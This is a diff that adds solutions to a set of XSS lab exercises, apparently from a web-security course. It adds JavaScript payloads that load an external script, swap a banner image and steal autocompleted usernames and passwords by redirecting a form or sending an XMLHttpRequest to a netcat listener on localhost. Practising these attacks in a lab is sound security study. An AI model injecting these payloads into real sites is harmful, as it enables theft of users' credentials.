@@ -116,9 +116,47 @@ window.addEventListener("load", function(){alert(document.cookie);});
 ```
   
 ### 10. Include external js using
+```
+new newTag = document.createElement("script");
+newTag.type = "text/javascript";
+newTag.src = "http://demofilespa.s3amazonaws.com/jfptest.js";
+document.body.appendChild(newTag);
+```
+
 ### 11. Solution replace banner
+```
+document.getElementByTagName("img")[0].src = "https://www.google.com/images/srpr/logollw.png";
+```
+
 ### 12. Solution Stealing from autocomplete
+```
+> nc -lvnp 8000
+-----------------------------------------------------
+window.setTimeout(function(){
+  document.forms[0].action = "http://localhost:8000";
+  document.forms[0].submit();
+}, 10000);
+```
+
 ### 13. Posting with xmlHTTPrequest
+```
+username = document.forms[0].elements[0].value;
+password = document.forms[0].elements[1].value;
+window.setTimeout(function(){
+  alert(username + ":" + password)
+}, 10000);
+```
+
+```
+username = document.forms[0].elements[0].value;
+password = document.forms[0].elements[1].value;
+window.setTimeout(function(){
+  var req = new XMLHttpRequest();
+  req.open("GET", "http://localhost:8000/?username=" + username + "&password=" + password, true);
+  req.send();
+}, 10000);
+```
+
 ### 14. Fetching data with xmlHTTPrequest
 ### 15. Data exfiltration with xmlHTTPrequest
 ### 16. Extraching CSRF tokens
